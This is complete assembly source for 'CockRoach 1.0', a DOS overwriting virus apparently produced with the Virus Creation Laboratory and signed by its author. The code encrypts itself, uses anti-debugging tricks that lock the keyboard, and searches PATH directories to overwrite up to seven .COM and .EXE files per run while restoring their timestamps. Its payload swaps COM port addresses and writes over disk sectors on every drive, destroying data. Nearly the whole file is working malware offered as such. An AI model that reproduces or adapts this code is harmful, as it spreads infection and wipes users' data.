; COCROACH.ASM -- CockRoach Virus 1.0
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Anonymous Caller

virus_type	equ	1			; Overwriting Virus
is_encrypted	equ	1			; We're encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main		proc	near
flag:		cmp	dx,0
		xchg	dx,ax

		call	encrypt_decrypt		; Decrypt the virus

start_of_code	label	near

stop_tracing:	mov	cx,09EBh
		mov	ax,0FE05h		; Acutal move, plus a HaLT
		jmp	$-2
		add	ah,03Bh			; AH now equals 025h
		jmp	$-10			; Execute the HaLT
		mov	bx,offset null_vector	; BX points to new routine
		push	cs			; Transfer CS into ES
		pop	es			; using a PUSH/POP
		int	021h
		mov	al,1			; Disable interrupt 1, too
		int	021h
		jmp	short skip_null		; Hop over the loop
null_vector:	jmp	$			; An infinite loop
skip_null:	mov	byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:	mov	al,128			; Change here screws DEBUG
		out	021h,al			; If tracing then lock keyboard

		mov	cx,0007h		; Do 7 infections
search_loop:	push	cx			; Save CX
		call	search_files		; Find and infect a file
		pop	cx			; Restore CX
		loop	search_loop		; Repeat until CX is 0

		mov	bx,0001h		; First argument is 1
		mov	si,0002h		; Second argument is 2
		push	es			; Save ES
		xor	ax,ax			; Set the extra segment to
		mov	es,ax                   ; zero (ROM BIOS)
		shl	bx,1			; Convert to word index
		shl	si,1			; Convert to word index
		mov	ax,word ptr [bx + 03FEh]; Zero COM port address
		xchg	word ptr [si + 03FEh],ax; Put first value in second,
		mov	word ptr [bx + 03FEh],ax; and second value in first!
		pop	es			; Restore ES

		mov	ax,0002h		; First argument is 2
		mov	cx,0096h		; Second argument is 150
		cli				; Disable interrupts (no Ctrl-C)
		cwd				; Clear DX (start with sector 0)
trash_loop:	int	026h			; DOS absolute write interrupt
		dec	ax			; Select the previous disk
		cmp	ax,-1			; Have we gone too far?
		jne	trash_loop		; If not, repeat with new drive
		sti				; Restore interrupts

		mov	ax,04C00h		; DOS terminate function
		int	021h
main		endp


		db	036h,0D6h,0D4h,0E6h,029h

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,135			; Allocate 135 bytes on stack

		mov	byte ptr [bp - 135],'\'	; Start with a backslash

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 134]		; SI points to 64-byte buffer
		int	021h

		call	traverse_path		; Start the traversal

traversal_loop:	cmp	word ptr [path_ad],0	; Was the search unsuccessful?
		je	done_searching		; If so then we're done
		call	found_subdir		; Otherwise copy the subdirectory

		mov	ax,cs			; AX holds the code segment
		mov	ds,ax			; Set the data and extra
		mov	es,ax			; segments to the code segment

		xor	al,al			; Zero AL
		stosb				; NULL-terminate the directory

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 70]		; DX points to the directory
		int	021h

		mov	dx,offset com_mask	; DX points to "*.COM"
		call	find_files		; Try to infect a .COM file
		jnc	done_searching		; If successful the exit
		mov	dx,offset exe_mask	; DX points to "*.EXE"
		call	find_files		; Try to infect an .EXE file
		jnc	done_searching		; If successful the exit
		jmp	short traversal_loop	; Keep checking the PATH

done_searching:	mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 135]		; DX points to old directory
		int	021h

		cmp	word ptr [path_ad],0	; Did we run out of directories?
		jne	at_least_tried		; If not then exit
		stc				; Set the carry flag for failure
at_least_tried:	mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller
com_mask	db	"*.COM",0		; Mask for all .COM files
exe_mask	db	"*.EXE",0		; Mask for all .EXE files
search_files	endp

traverse_path	proc	near
		mov	es,word ptr cs:[002Ch]	; ES holds the enviroment segment
		xor	di,di			; DI holds the starting offset

find_path:	mov	si,offset path_string	; SI points to "PATH="
		lodsb				; Load the "P" into AL
		mov	cx,08000h		; Check the first 32767 bytes
	repne	scasb				; Search until the byte is found
		mov	cx,4			; Check the next four bytes
check_next_4:	lodsb				; Load the next letter of "PATH="
		scasb				; Compare it to the environment
		jne	find_path		; If there not equal try again
		loop	check_next_4		; Otherwise keep checking

		mov	word ptr [path_ad],di	; Save the PATH address for later
		mov	word ptr [path_ad + 2],es  ; Save PATH's segment for later
		ret				; Return to caller

path_string	db	"PATH="			; The PATH string to search for
path_ad		dd	?			; Holds the PATH's address
traverse_path	endp

found_subdir	proc	near
		lds	si,dword ptr [path_ad]	; DS:SI points to the PATH
		lea	di,[bp - 70]		; DI points to the work buffer
		push	cs			; Transfer CS into ES for
		pop	es			; byte transfer
move_subdir:	lodsb				; Load the next byte into AL
		cmp	al,';'			; Have we reached a separator?
		je	moved_one		; If so we're done copying
		or	al,al			; Are we finished with the PATH?
		je	moved_last_one		; If so get out of here
		stosb				; Store the byte at ES:DI
		jmp	short move_subdir	; Keep transfering characters

moved_last_one:	xor	si,si			; Zero SI to signal completion
moved_one:	mov	word ptr es:[path_ad],si; Store SI in the path address
		ret				; Return to caller
found_subdir	endp

		db	010h,08Eh,0B5h,016h,002h


find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

		db	0FDh,052h,0B3h,06Ah,08Ch

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	byte ptr [set_carry],0	; Assume we'll fail

		cmp	word ptr [si + 01Ch],0	; Is the file > 65535 bytes?
		jne	infection_done		; If it is then exit

		cmp	word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je	infection_done		; If it is then skip it

		cmp	word ptr [si + 01Ah],(finish - start)
		jb	infection_done		; If it's too small then exit

		mov	ax,03D00h		; DOS open file function, r/o
		lea	dx,[si + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh			; DOS read from file function
		mov	cx,4			; CX holds bytes to read (4)
		mov	dx,offset buffer	; DX points to buffer
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		push	si			; Save DTA address before compare
		mov	si,offset buffer	; SI points to comparison buffer
		mov	di,offset flag		; DI points to virus flag
		mov	cx,4			; CX holds number of bytes (4)
	rep	cmpsb				; Compare the first four bytes
		pop	si			; Restore DTA address
		je	infection_done		; If equal then exit
		mov	byte ptr [set_carry],1	; Success -- the file is OK

		mov	ax,04301h		; DOS set file attrib. function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		push	si			; Save SI through call
		call	encrypt_code		; Write an encrypted copy
		pop	si			; Restore SI

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attrib. function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done:	cmp	byte ptr [set_carry],1	; Set carry flag if failed
		ret				; Return to caller

buffer		db	4 dup (?)		; Buffer to hold test data
set_carry	db	?			; Set-carry-on-exit flag
infect_file	endp


vcl_marker	db	"[VCL]",0		; VCL creation marker


note		db	"CockRoach 1.0 Virus"
		db	"By Anonymous Caller"
		db	"[LegenD] Systems 1992!"

encrypt_code	proc	near
		mov	si,offset encrypt_decrypt; SI points to cipher routine

		xor	ah,ah			; BIOS get time function
		int	01Ah
		mov	word ptr [si + 8],dx	; Low word of timer is new key

		xor	byte ptr [si],1		;
		xor	byte ptr [si + 7],1	; Change all SIs to DIs
		xor	word ptr [si + 10],0101h; (and vice-versa)

		mov	di,offset finish	; Copy routine into heap
		mov	cx,finish - encrypt_decrypt - 1  ; All but final RET
		push	si			; Save SI for later
		push	cx			; Save CX for later
	rep	movsb				; Copy the bytes

		mov	si,offset write_stuff	; SI points to write stuff
		mov	cx,5			; CX holds length of write
	rep	movsb				; Copy the bytes

		pop	cx			; Restore CX
		pop	si			; Restore SI
		inc	cx			; Copy the RET also this time
	rep	movsb				; Copy the routine again

		mov	ah,040h			; DOS write to file function
		mov	dx,offset start		; DX points to virus

		call	finish			; Encrypt/write/decrypt

		ret				; Return to caller

write_stuff:	mov	cx,finish - start	; Length of code
		int	021h
encrypt_code	endp

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	si,offset start_of_code ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	db	081h,034h,00h,00h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt	endp
finish		label	near

code		ends
		end	main